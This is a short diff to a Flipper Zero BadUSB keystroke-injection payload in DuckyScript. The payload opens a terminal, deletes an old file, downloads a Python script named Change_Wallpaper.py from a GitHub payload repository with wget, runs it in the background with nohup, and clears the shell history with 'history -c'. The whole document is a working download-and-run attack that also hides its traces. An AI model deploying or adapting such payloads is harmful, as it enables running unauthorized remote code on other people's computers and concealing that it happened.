@@ -1,7 +1,9 @@
 CTRL-ALT t
 DELAY 800
+STRING rm Change_Wallpaper.py
+DELAY 800
 STRINGLN wget https://raw.githubusercontent.com/Capaseztel/FlipperPayloads/main/Python%20Payloads/GNU/Change_Wallpaper.py
-DELAY 2000
+DELAY 1600
 STRINGLN nohup python3 Change_Wallpaper.py &
 DELAY 600
 STRINGLN history -c
